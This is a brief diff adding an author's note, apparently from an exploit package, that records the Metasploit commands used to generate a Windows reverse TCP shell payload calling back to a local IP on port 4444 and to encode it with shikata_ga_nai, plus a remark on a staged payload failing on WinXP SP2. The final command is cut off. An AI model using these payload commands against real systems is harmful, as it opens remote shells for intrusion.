@@ -1,0 +1,9 @@
+Generated with:
+
+msfpayload windows/shell_reverse_tcp LPORT=4444 LHOST=192.168.10.94 EXITFUNC=thread R
+
+Please note that windows/shell/reverse_tcp had problems with spawning cmd.exe on WinXP SP2 but windows/shell_reverse_tcp worked fine. Not sure what was the problem, it connected back to LHOST fine but no cmd.exe. I didn't have time to troubleshoot it further since the other shellcode worked fine.
+
+Encoded with:
+
+cmsfencode -b \x00 -e x86/shikata_ga_nai -i exp
